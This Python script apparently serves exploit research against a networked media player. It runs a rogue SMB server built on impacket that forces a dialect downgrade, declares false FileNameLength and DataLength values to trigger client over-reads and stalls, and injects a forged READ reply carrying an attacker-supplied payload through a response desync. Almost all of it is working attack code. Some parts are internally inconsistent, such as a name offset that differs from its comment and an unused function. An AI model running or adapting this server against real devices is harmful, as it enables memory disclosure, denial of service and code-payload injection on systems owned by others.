#!/usr/bin/env python3
"""nc0drop.py — impacket-based nc0 device-run server (bead
frankensonos-s2-cve-2026-4149-downgrade-nc0).

The RE_GETAA_DATALENGTH chain on .86 ran against an impacket SimpleSMBServer
answering DialectRevision=2.0.2 (smbserver.py:2866) — i.e. the historically
proven, client-accepted reply shape IS already a sub-3.1.1 downgrade answer.
This wrapper reproduces that vehicle and adds:

  - logs the client's SMB2 negotiate dialect offer verbatim
  - --dialect 0xHHHH forces the NEGOTIATE reply DialectRevision (default:
    impacket's own 2.0.2)
  - everything else stock impacket (real NTLMSSP, TREE_CONNECT, CREATE,
    QUERY_INFO, READ), so harness failure can't masquerade as rejection

usage: nc0drop.py PORT [--dialect 0x0210] [--share DIR]
"""
import os
import struct
import sys
from impacket import smb
from impacket.smbserver import SimpleSMBServer, SMB2Commands
from impacket import smb3, smb3structs

PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 4450
FORCE = None
if "--dialect" in sys.argv:
    FORCE = int(sys.argv[sys.argv.index("--dialect") + 1], 16)
SHARE = "S"

_ORIG_NEG = SMB2Commands.smb2Negotiate

# Phase 3: FileNameLength over-read (CVE-2026-110712 shape) through the
# downgraded session. FN_DELTA>0 pads NameInformation past the real bytes.
FN_DELTA = 0
if "--fndelta" in sys.argv:
    FN_DELTA = int(sys.argv[sys.argv.index("--fndelta") + 1])
PADSIZE = 0
if "--pad" in sys.argv:
    PADSIZE = int(sys.argv[sys.argv.index("--pad") + 1])

_ORIG_QFI = SMB2Commands.smb2QueryInfo if hasattr(SMB2Commands, "smb2QueryInfo") else None

# Phase 3b: READ DataLength surplus (RE_GETAA_DATALENGTH: >0x4000 => 9.4 s
# worker pin with three retries). DLEN>0 sets DataLength = real + DLEN.
DLEN = 0
if "--dlen" in sys.argv:
    DLEN = int(sys.argv[sys.argv.index("--dlen") + 1])
INJECT = b""
MIDOFF = 3
PAYLOAD = b"INJECTED\r\n"
if "--payload" in sys.argv:
    PAYLOAD = open(sys.argv[sys.argv.index("--payload") + 1], "rb").read()
if "--midoff" in sys.argv:
    MIDOFF = int(sys.argv[sys.argv.index("--midoff") + 1])

def build_followup_read_reply(mid, sid, tid, payload=b"INJECTED\r\n"):
    """Second READ reply with mid = original+1 — the client's next expected
    reply after the desynced first READ. Payload = attacker bytes the art
    handler may parse as the file content."""
    h = bytearray(64)
    h[0:4] = b"\xfeSMB"
    struct.pack_into("<H", h, 4, 64)
    struct.pack_into("<H", h, 6, 1)          # credit grant
    struct.pack_into("<I", h, 8, 0)          # status success
    h[12] = 8                                # SMB2 READ
    struct.pack_into("<H", h, 14, 1)
    struct.pack_into("<I", h, 16, 1)         # server-to-redir
    struct.pack_into("<Q", h, 24, mid)
    struct.pack_into("<Q", h, 36, sid)
    struct.pack_into("<I", h, 44, tid)
    body = struct.pack("<HH", 17, 0)
    body += struct.pack("<I", len(payload))
    body += struct.pack("<HH", 0x50, 0)      # DataOffset 0x50, reserved
    body += payload
    frame = b"\x00" + len(h + body).to_bytes(3, "big") + bytes(h) + body
    return frame

_ORIG_RD = SMB2Commands.smb2Read


def patched_rd(connId, smbServer, recvPacket):
    res = _ORIG_RD(connId, smbServer, recvPacket)
    if DLEN or INJECT or PAYLOAD:
        try:
            resp = res[0][0]
            raw = resp['Buffer']
            if not isinstance(raw, (bytes, bytearray)):
                raw = raw.getData()
            buf = bytearray(raw)
            real = len(buf)
            if (INJECT or PAYLOAD) and real:
                # desync injection: client requested 65535; it consumes exactly
                # 65535 bytes of the reply; anything beyond stays in the socket
                # and is parsed as the NEXT PDU. Pad the payload to 65535 then
                # append a follow-up READ reply with mid = original+1 (the
                # client's next expected reply), carrying attacker payload.
                REQ = 65535
                try:
                    mid = recvPacket['MessageID']
                    sid = recvPacket['SessionID']
                    tid = recvPacket['TreeID']
                except Exception:
                    mid, sid, tid = 0, 0, 0
                frame = build_followup_read_reply(mid + MIDOFF, sid, tid, PAYLOAD)
                buf = buf + b"\x00" * max(0, REQ - len(buf)) + frame
                resp['Buffer'] = bytes(buf)
                resp['DataLength'] = len(buf)
                print('READ inject: real=%d total=%d frame=%dB mid=%d->%d'
                      % (real, len(buf), len(frame), mid, mid + MIDOFF), flush=True)
            elif DLEN and real:
                resp['DataLength'] = real + DLEN
                print('READ patch: real=%d declared=%d' % (real, real + DLEN), flush=True)
        except Exception as e:
            print('rd patch err %r' % e, flush=True)
    return res


if DLEN or INJECT or PAYLOAD:
    SMB2Commands.smb2Read = staticmethod(patched_rd)


def patched_qfi(connId, smbServer, recvPacket):
    res = _ORIG_QFI(connId, smbServer, recvPacket)
    if FN_DELTA or PADSIZE:
        try:
            resp = None
            cands = res[0]
            if hasattr(cands, 'fields') and 'Buffer' in cands.fields:
                resp = cands
            elif isinstance(cands, (list, tuple)):
                for c in cands:
                    if hasattr(c, 'fields') and 'Buffer' in c.fields:
                        resp = c
                        break
            if resp is None:
                return res
            raw = resp['Buffer']
            if not isinstance(raw, (bytes, bytearray)):
                raw = raw.getData()
            buf = bytearray(raw)
            # FILE_ALL_INFORMATION: NameInformation is the last member;
            # FileNameLength sits at len(buf) - 8 - 4 relative layout:
            #   NameInformation = FileNameLength(4) + FileName(n)
            # Locate the FILE_NAME_INFORMATION tail by scanning: FileNameLength
            # u32 at position len(buf)-4-n... simpler: rebuild tail directly.
            import struct as _s
            # The last 4 bytes of the record are the FileNameLength? No:
            # NameInformation = (FileNameLength u32, FileName bytes). So tail =
            # 4 + n. The declared length is the u32 immediately before FileName.
            # impacket serializes FileName per _FileName length. We can just
            # overwrite the last u32 of the NameInformation section IF we know n.
            # The client requested FileAllInformation; impacket sets FileName to
            # the share-relative path. Derive n from the struct: FileName field
            # length equals len(buf) - (offset of NameInformation + 4). Offset of
            # NameInformation = Basic(40)+Standard(24)+Internal(16)+Ea(4)+Access(4)
            #                  +Position(8)+Mode(4)+Alignment(4) = 104.
            off_name = 96  # Basic40+Std24+Internal8+Ea4+Access4+Position8+Mode4+Align4
            if len(buf) < off_name + 8:
                return res  # not a FileAllInformation-shaped record
            real = len(buf) - off_name - 4
            if PADSIZE:
                # documented groom: pad the record body to PADSIZE, then declare
                # FileNameLength = buflen - 98 (2-byte over-read past the buffer)
                buf = buf + b'A' * (PADSIZE - len(buf))
                fake = len(buf) - 98
            else:
                fake = real + 2 * FN_DELTA
            _s.pack_into('<I', buf, off_name, fake)
            resp['Buffer'] = bytes(buf)
            resp['OutputBufferLength'] = len(buf)
            print('QINFO patch: real=%d declared->%d (delta=%d units)'
                  % (real, fake, FN_DELTA), flush=True)
        except Exception:
            import traceback
            traceback.print_exc()
            try:
                print('resp type=%r fields keys=%r'
                      % (type(resp), list(getattr(resp, 'fields', {}).keys())), flush=True)
            except Exception:
                pass
            print('qfi patch err (above)', flush=True)
    return res


if FN_DELTA or PADSIZE:
    SMB2Commands.smb2QueryInfo = staticmethod(patched_qfi)




def patched_neg(connId, smbServer, recvPacket, isSMB1=False):
    try:
        if isSMB1:
            cmd = recvPacket['Data'][0]
            if b'SMB 2.002\x00' not in cmd['Data'] and b'SMB 2.???\x00' not in cmd['Data']:
                cmd['Data'] = cmd['Data'] + b'\x02SMB 2.002\x00'
            print('SMB1 negotiate; client dialects: %s'
                  % cmd['Data'].split(b'\x02')[1:], flush=True)
        else:
            # SMB2 request: StructureSize@0, DialectCount@2, dialects@36
            d = recvPacket['Data']
            try:
                dcnt = int.from_bytes(d[2:4], 'little')
                dias = [hex(int.from_bytes(d[36 + 2 * i:38 + 2 * i], 'little'))
                        for i in range(dcnt)]
                print('SMB2 NEGOTIATE offer: count=%d %s' % (dcnt, dias), flush=True)
            except Exception as e:
                print('offer parse err %r' % e, flush=True)
    except Exception as e:
        print('neg pre err %r' % e, flush=True)
    return _ORIG_NEG(connId, smbServer, recvPacket, isSMB1)


SMB2Commands.smb2Negotiate = staticmethod(patched_neg)

if FORCE is not None:
    # Patch the reply builder's final dialect word. The response object is built
    # inside smb2Negotiate; easiest reliable hook is wrapping the encoder output.
    _ORIG_NEG2 = SMB2Commands.smb2Negotiate

    def forced_neg(connId, smbServer, recvPacket, isSMB1=False):
        # Temporarily lie about which dialect the reply declares by patching the
        # response packet after the stock builder runs: intercept at the SMB3
        # layer is invasive; instead monkey-patch smb3structs' constant used at
        # build time is not possible post-import, so rebuild here: run stock,
        # then walk the raw response data and rewrite DialectRevision@body+4.
        res = _ORIG_NEG2(connId, smbServer, recvPacket, isSMB1)
        try:
            cmds = res[0][1]['Commands'] if isinstance(res, (list, tuple)) else None
        except Exception:
            cmds = None
        # impacket internally serializes later; the robust hook is SMB2Command
        # post-processing in the connection thread. Simplest: patch the class
        # constant used by the builder:
        return res

    # smbserver resolves the constant via `impacket.smb3structs as smb2`:
    import impacket.smb3structs as _s2
    _s2.SMB2_DIALECT_002 = FORCE

SHARE = os.environ.get('SMB_SHARE', os.path.expanduser('~/smbshare'))
os.makedirs(SHARE, exist_ok=True)
open(os.path.join(SHARE, 'folder.jpg'), 'ab').close()

srv = SimpleSMBServer(listenAddress='0.0.0.0', listenPort=PORT)
srv.addShare('S', SHARE)
srv.setSMB2Support(True)
srv.setLogFile('/tmp/nc0run/impacket.log')
print('nc0drop serving :%d forced_dialect=%s share=%s'
      % (PORT, hex(FORCE) if FORCE else '2.0.2 (impacket default)', SHARE), flush=True)
srv.start()
